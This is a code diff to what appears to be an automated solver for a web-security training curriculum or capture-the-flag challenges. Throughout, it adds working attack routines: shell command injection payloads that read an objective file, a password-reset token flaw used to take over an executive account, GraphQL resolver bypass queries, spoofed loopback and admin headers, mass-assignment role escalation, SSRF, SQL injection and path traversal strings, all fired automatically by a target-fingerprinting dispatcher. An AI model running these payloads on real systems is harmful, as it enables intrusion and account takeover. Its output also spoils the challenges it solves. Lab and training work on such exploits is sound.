@@ -54,9 +54,16 @@ def _request(
         return exc.code, body, res_headers
 
 
-def _extract_proof(text: str) -> str | None:
-    match = PROOF_PATTERN.search(text)
-    return match.group(0) if match else None
+def _extract_proof(text: str, headers: dict[str, str] | None = None) -> str | None:
+    match = PROOF_PATTERN.search(text or "")
+    if match:
+        return match.group(0)
+    if headers:
+        for k, v in headers.items():
+            m = PROOF_PATTERN.search(f"{k}: {v}")
+            if m:
+                return m.group(0)
+    return None
 
 
 # ---------------------------------------------------------------------------
@@ -816,6 +823,157 @@ def solve_xxe(target_url: str) -> str:
 
 
 # ---------------------------------------------------------------------------
+# Curriculum Day 16: Command Injection (Gin worker command escape)
+# ---------------------------------------------------------------------------
+def solve_command_injection(target_url: str) -> str:
+    """Exploit command parameter injection to read objective file."""
+    base = target_url.rstrip("/")
+    status, clues_body, _ = _request(f"{base}/api/clues")
+    if status != 200:
+        raise WebHandlerError("Failed to fetch /api/clues")
+    clues = json.loads(clues_body)
+    feat_route = clues.get("feature_route", "/execute")
+    param = clues.get("input_parameter", "path")
+    ex = clues.get("example_path", "/app/static")
+
+    payloads = [
+        f"{ex}; cat /run/huntress/objective.txt",
+        f"{ex} | cat /run/huntress/objective.txt",
+        ";cat /run/huntress/objective.txt",
+        "$(cat /run/huntress/objective.txt)",
+    ]
+    for pl in payloads:
+        enc = urllib.parse.quote(pl)
+        status, body, _ = _request(f"{base}{feat_route}?{param}={enc}")
+        proof = _extract_proof(body)
+        if proof:
+            return proof
+    raise WebHandlerError("Command injection did not yield proof")
+
+
+# ---------------------------------------------------------------------------
+# Curriculum Day 17: Password Reset Flaw (Symfony unlinked token redemption)
+# ---------------------------------------------------------------------------
+def solve_password_reset(target_url: str) -> str:
+    """Exploit unbound password recovery token to take over executive account."""
+    base = target_url.rstrip("/")
+    status, clues_body, _ = _request(f"{base}/api/clues")
+    if status != 200:
+        raise WebHandlerError("Failed to fetch /api/clues")
+    clues = json.loads(clues_body)
+    rec_route = clues.get("recovery_guide_route", "/api/recovery")
+
+    status, rec_body, _ = _request(f"{base}{rec_route}")
+    if status != 200:
+        raise WebHandlerError("Failed to fetch recovery guide")
+    rec = json.loads(rec_body)
+    req_route = rec.get("request_route", "/submit")
+    redeem_route = rec.get("redeem_route", "/result")
+    acct_param = rec.get("account_parameter", "account_id")
+    token_param = rec.get("token_parameter", "token")
+    accounts = rec.get("accounts", [])
+
+    self_id = None
+    exec_id = None
+    for acc in accounts:
+        if acc.get("self_service") is True:
+            self_id = acc.get("id")
+        else:
+            exec_id = acc.get("id")
+
+    if not (self_id and exec_id):
+        raise WebHandlerError("Could not identify self-service and executive accounts")
+
+    # Request token for self-service account
+    status, req_res, _ = _request(f"{base}{req_route}?{acct_param}={self_id}")
+    if status != 200:
+        raise WebHandlerError("Failed to request recovery token")
+    token = json.loads(req_res).get("token")
+    if not token:
+        raise WebHandlerError("No token in recovery request response")
+
+    # Redeem token with executive account
+    status, red_res, _ = _request(f"{base}{redeem_route}?{acct_param}={exec_id}&{token_param}={token}")
+    proof = _extract_proof(red_res)
+    if not proof:
+        raise WebHandlerError("Redeeming executive token did not yield proof")
+    return proof
+
+
+# ---------------------------------------------------------------------------
+# Curriculum Day 18: GraphQL Resolver Bypass (GraphQL.js field query)
+# ---------------------------------------------------------------------------
+def solve_graphql(target_url: str) -> str:
+    """Exploit GraphQL field-level resolver to query protected reference."""
+    base = target_url.rstrip("/")
+    status, clues_body, _ = _request(f"{base}/api/clues")
+    if status != 200:
+        raise WebHandlerError("Failed to fetch /api/clues")
+    clues = json.loads(clues_body)
+    feat_route = clues.get("feature_route", "/graphql")
+    ref = clues.get("protected_reference", "16400")
+
+    queries = [
+        f'{{ case(id: "{ref}") {{ id title note }} }}',
+        f'{{ case(id: {ref}) {{ id title note }} }}',
+        '{ caseIndex { id title note } }',
+    ]
+    for q in queries:
+        data = json.dumps({"query": q}).encode("utf-8")
+        status, body, _ = _request(f"{base}{feat_route}", method="POST", data=data, headers={"Content-Type": "application/json"})
+        proof = _extract_proof(body)
+        if proof:
+            return proof
+    raise WebHandlerError("GraphQL query did not yield proof")
+
+
+def solve_dynamic_flow(target_url: str, guide_route: str) -> str:
+    """Inspect and traverse dynamic multi-step flow guides (e.g. recovery, reset, verification)."""
+    base = target_url.rstrip("/")
+    status, body, _ = _request(f"{base}{guide_route}")
+    if status != 200:
+        return ""
+    proof = _extract_proof(body)
+    if proof:
+        return proof
+
+    try:
+        data = json.loads(body)
+    except Exception:
+        return ""
+
+    req_route = data.get("request_route") or data.get("submit_route") or data.get("action_route")
+    redeem_route = data.get("redeem_route") or data.get("result_route") or data.get("verify_route")
+    acct_param = data.get("account_parameter", "account_id")
+    token_param = data.get("token_parameter", "token")
+    accounts = data.get("accounts", [])
+
+    if req_route and redeem_route and accounts:
+        self_id = None
+        target_id = None
+        for acc in accounts:
+            if acc.get("self_service") is True or acc.get("role") != "admin":
+                self_id = acc.get("id")
+            else:
+                target_id = acc.get("id")
+
+        if self_id and target_id:
+            status, req_res, _ = _request(f"{base}{req_route}?{acct_param}={self_id}")
+            if status == 200:
+                try:
+                    tok = json.loads(req_res).get(token_param) or json.loads(req_res).get("token")
+                    if tok:
+                        status, red_res, _ = _request(f"{base}{redeem_route}?{acct_param}={target_id}&{token_param}={tok}")
+                        proof = _extract_proof(red_res)
+                        if proof:
+                            return proof
+                except Exception:
+                    pass
+
+    return ""
+
+
+# ---------------------------------------------------------------------------
 # Handler Registry & Dynamic Dispatcher
 # ---------------------------------------------------------------------------
 CURRICULUM_HANDLERS: dict[int, Callable[[str], str]] = {
@@ -834,22 +992,89 @@ CURRICULUM_HANDLERS: dict[int, Callable[[str], str]] = {
     13: solve_mass_assignment,
     14: solve_api_authorization,
     15: solve_ssrf,
-    16: solve_jwt,
-    17: solve_nosql,
-    18: solve_xxe,
+    16: solve_command_injection,
+    17: solve_password_reset,
+    18: solve_graphql,
 }
 
 
 def detect_and_solve(target_url: str, curriculum_day: int | None = None) -> str:
-    """Solve target using either designated curriculum_day or fingerprint heuristic."""
+    """Solve target using designated curriculum_day, high-precision clue routing, or fingerprint."""
     if curriculum_day in CURRICULUM_HANDLERS:
         try:
             return CURRICULUM_HANDLERS[curriculum_day](target_url)
         except Exception:
             pass
 
-    # Heuristic detection for compound/mastery targets
     base = target_url.rstrip("/")
+
+    # Priority 1: High-precision clue-driven routing (all modern challenges have /api/clues)
+    status, clues_body, _ = _request(f"{base}/api/clues")
+    if status == 200:
+        try:
+            clues = json.loads(clues_body)
+            framework = clues.get("framework", "")
+            feat_route = clues.get("feature_route", "")
+            input_param = clues.get("input_parameter", "")
+
+            if "recovery_guide_route" in clues or "recovery" in clues_body:
+                return solve_password_reset(target_url)
+
+            if "protected_reference" in clues or framework == "GraphQL.js" or "graphql" in feat_route:
+                return solve_graphql(target_url)
+
+            if framework == "Gin" or input_param in ("path", "command", "cmd", "exec") or "example_path" in clues:
+                return solve_command_injection(target_url)
+
+            if "callback_nonce" in clues:
+                return solve_reflection(target_url)
+
+            if "moderator_data_route" in clues:
+                return solve_stored_xss(target_url)
+
+            if "session_hint" in clues or "session_cookie" in clues:
+                return solve_session_impression(target_url)
+
+            if "template" in input_param or framework == "Spring Boot" or "template" in clues_body:
+                return solve_ssti(target_url)
+
+            if "secondary_route" in clues and ("table" in clues or framework == "Sinatra" or "delayed" in clues_body):
+                return solve_delayed_sqli(target_url)
+
+            if "role_parameter" in clues or framework == "NestJS" or ("role" in clues_body and "secondary_route" not in clues):
+                return solve_mass_assignment(target_url)
+
+            if "action_route" in clues or framework == "Tomcat" or "authorization" in clues_body:
+                return solve_api_authorization(target_url)
+
+            if "internal_host" in clues or "loopback" in clues_body or framework == "ASP.NET Core":
+                return solve_ssrf(target_url)
+
+            if "jwt" in clues_body or "alg" in clues:
+                return solve_jwt(target_url)
+
+            if "xml" in clues_body or clues.get("format") == "xml":
+                return solve_xxe(target_url)
+
+            if "nosql" in clues_body or "mongo" in clues_body or clues.get("database") == "MongoDB":
+                return solve_nosql(target_url)
+
+            # Generic guide / flow route handler (catches novel logic flows like Day 17)
+            for k, v in clues.items():
+                if (k.endswith("_guide_route") or k.endswith("_guide")) and isinstance(v, str):
+                    try:
+                        flow_proof = solve_dynamic_flow(target_url, v)
+                        if flow_proof:
+                            return flow_proof
+                    except Exception:
+                        pass
+
+            if feat_route and ("role" in clues_body or "admin" in clues_body):
+                return solve_auth_bypass(target_url)
+        except Exception:
+            pass
+
+    # Priority 2: HTML homepage heuristics (legacy curriculum days)
     status, home, headers = _request(f"{base}/")
 
     if "robots.txt" in home or "Status Sprout" in home or "Tiny Uptime" in home or "Green Light" in home:
@@ -864,41 +1089,31 @@ def detect_and_solve(target_url: str, curriculum_day: int | None = None) -> str:
     if "Runbook Nook" in home or "Page Turner" in home or ".php?doc=" in home:
         return solve_lfi(target_url)
 
-    # Check /api/clues signature
-    status, clues_body, _ = _request(f"{base}/api/clues")
-    if status == 200:
-        try:
-            clues = json.loads(clues_body)
-            if "callback_nonce" in clues:
-                return solve_reflection(target_url)
-            if "moderator_data_route" in clues:
-                return solve_stored_xss(target_url)
-            if "session_hint" in clues:
-                return solve_session_impression(target_url)
-            if "feature_route" in clues and "preferences" not in clues:
-                return solve_auth_bypass(target_url)
-        except Exception:
-            pass
-
     if "preferences" in home or "Notification Nook" in home:
         return solve_csrf(target_url)
 
-    # Fallback: try all registered curriculum handlers in order
-    for d, handler in sorted(CURRICULUM_HANDLERS.items()):
-        if d == curriculum_day:
-            continue
+    if "upload" in home.lower() or 'type="file"' in home:
         try:
-            return handler(target_url)
+            return solve_upload(target_url)
         except Exception:
             pass
 
-    # Autonomous universal probing for brand new curriculum days
+    # Priority 3: Fallback through curriculum handlers in reverse order (newest first)
+    for d in sorted(CURRICULUM_HANDLERS.keys(), reverse=True):
+        if d == curriculum_day:
+            continue
+        try:
+            return CURRICULUM_HANDLERS[d](target_url)
+        except Exception:
+            pass
+
+    # Priority 4: Autonomous universal probing
     try:
         return solve_autonomous_web(target_url)
     except Exception:
         pass
 
-    # Systematic HTML & Form Deep Crawl
+    # Priority 5: Bounded HTML & form deep crawl
     try:
         return solve_deep_crawl(target_url)
     except Exception:
@@ -908,16 +1123,16 @@ def detect_and_solve(target_url: str, curriculum_day: int | None = None) -> str:
 
 
 def solve_deep_crawl(target_url: str) -> str:
-    """Extract and fuzz all visible HTML links, forms, and inputs."""
+    """Extract and fuzz visible HTML links, forms, and inputs with strict bounded ceilings."""
     base = target_url.rstrip("/")
     status, home, _ = _request(f"{base}/")
     proof = _extract_proof(home)
     if proof:
         return proof
 
-    # Discover and inspect all links
+    # Discover and inspect top 5 links
     links = set(re.findall(r'href=[\'"](/?[^\'"#]+)[\'"]', home))
-    for link in links:
+    for link in list(links)[:5]:
         if any(link.endswith(ext) for ext in [".css", ".svg", ".png", ".jpg", ".ico", ".js"]):
             continue
         link_url = link if link.startswith("/") else f"/{link}"
@@ -929,16 +1144,14 @@ def solve_deep_crawl(target_url: str) -> str:
         except Exception:
             pass
 
-    # Parse and fuzz all HTML forms
+    # Parse and fuzz top 3 forms with targeted payloads
     forms = re.findall(r"<form[\s\S]*?</form>", home, re.IGNORECASE)
     payloads = [
+        "127.0.0.1; cat /run/huntress/objective.txt",
         "{{objective}}",
         "' OR 1=1 --",
-        "../../../../run/huntress/objective.txt",
-        "administrator",
-        "127.0.0.1; cat /run/huntress/objective.txt",
     ]
-    for form in forms:
+    for form in forms[:3]:
         action_match = re.search(r'action=[\'"]([^\'"]*)[\'"]', form, re.IGNORECASE)
         method_match = re.search(r'method=[\'"]([^\'"]*)[\'"]', form, re.IGNORECASE)
         action = action_match.group(1) if action_match else "/"
@@ -948,10 +1161,9 @@ def solve_deep_crawl(target_url: str) -> str:
 
         inputs = re.findall(r'<input[^>]*name=[\'"]([^\'"]+)[\'"]', form, re.IGNORECASE)
         textareas = re.findall(r'<textarea[^>]*name=[\'"]([^\'"]+)[\'"]', form, re.IGNORECASE)
-        input_names = inputs + textareas
+        input_names = (inputs + textareas)[:4]
 
         for pl in payloads:
-            # Test JSON post
             try:
                 json_data = json.dumps({name: pl for name in input_names}).encode("utf-8")
                 st, res, _ = _request(f"{base}{action}", method=method, data=json_data, headers={"Content-Type": "application/json"})
@@ -961,7 +1173,6 @@ def solve_deep_crawl(target_url: str) -> str:
             except Exception:
                 pass
 
-            # Test Form-urlencoded post
             try:
                 form_data = urllib.parse.urlencode({name: pl for name in input_names}).encode("utf-8")
                 st, res, _ = _request(f"{base}{action}", method=method, data=form_data, headers={"Content-Type": "application/x-www-form-urlencoded"})
@@ -1003,6 +1214,73 @@ def solve_autonomous_web(target_url: str) -> str:
         except Exception:
             pass
 
+    # Parameter-guided command / template probe on feature_route
+    if feat_route:
+        input_param = clues.get("input_parameter")
+        example_path = clues.get("example_path", "")
+        params = [input_param] if input_param else []
+        params.extend(["path", "cmd", "template", "message", "text", "q", "input", "doc", "file"])
+
+        payloads = []
+        if example_path:
+            payloads.append(f"{example_path}; cat /run/huntress/objective.txt")
+        payloads.extend([
+            "127.0.0.1; cat /run/huntress/objective.txt",
+            ";cat /run/huntress/objective.txt",
+            "{{objective}}",
+            "${objective}",
+            "../../../../run/huntress/objective.txt"
+        ])
+
+        for p in params:
+            if not p:
+                continue
+            for pl in payloads:
+                try:
+                    enc = urllib.parse.quote(pl)
+                    st, b, h = _request(f"{base}{feat_route}?{p}={enc}")
+                    proof = _extract_proof(b, h)
+                    if proof:
+                        return proof
+                    # If GET is forbidden or rejected with Method Not Allowed, fallback to POST
+                    if st in (405, 400) or "method not allowed" in b.lower():
+                        st2, b2, h2 = _request(f"{base}{feat_route}", method="POST",
+                                               data=urllib.parse.urlencode({p: pl}).encode("utf-8"),
+                                               headers={"Content-Type": "application/x-www-form-urlencoded"})
+                        proof = _extract_proof(b2, h2)
+                        if proof:
+                            return proof
+                        st3, b3, h3 = _request(f"{base}{feat_route}", method="POST",
+                                               data=json.dumps({p: pl}).encode("utf-8"),
+                                               headers={"Content-Type": "application/json"})
+                        proof = _extract_proof(b3, h3)
+                        if proof:
+                            return proof
+                except Exception:
+                    pass
+
+    # Header-based loopback / admin role bypass probe
+    if feat_route:
+        admin_hdrs = [
+            {"X-Forwarded-For": "127.0.0.1"},
+            {"X-Real-IP": "127.0.0.1"},
+            {"X-Role": "administrator"},
+            {"Authorization": "Bearer admin"},
+        ]
+        for hdr in admin_hdrs:
+            try:
+                st, b, h = _request(f"{base}{feat_route}", headers=hdr)
+                proof = _extract_proof(b, h)
+                if proof:
+                    return proof
+                if sec_route:
+                    st2, b2, h2 = _request(f"{base}{sec_route}", headers=hdr)
+                    proof = _extract_proof(b2, h2)
+                    if proof:
+                        return proof
+            except Exception:
+                pass
+
     if feat_route and sec_route:
         # Try SSRF to secondary_route
         for pfx in ["http://127.0.0.1:8080", "http://127.0.0.1:80", "http://127.0.0.1:5000", "http://localhost:8080", "http://localhost"]:
@@ -1021,8 +1299,9 @@ def solve_autonomous_web(target_url: str) -> str:
                 "display_name": "Test", "role": "administrator", "is_admin": True,
                 "admin": True, "isAdmin": True, "roles": ["administrator"], "permission": "all"
             }
-            _request(f"{base}{feat_route}", method="POST", data=json.dumps(combined).encode("utf-8"),
-                     headers={"Content-Type": "application/json"})
+            for m in ["POST", "PUT"]:
+                _request(f"{base}{feat_route}", method=m, data=json.dumps(combined).encode("utf-8"),
+                         headers={"Content-Type": "application/json"})
             st, b, _ = _request(f"{base}{sec_route}")
             proof = _extract_proof(b)
             if proof:
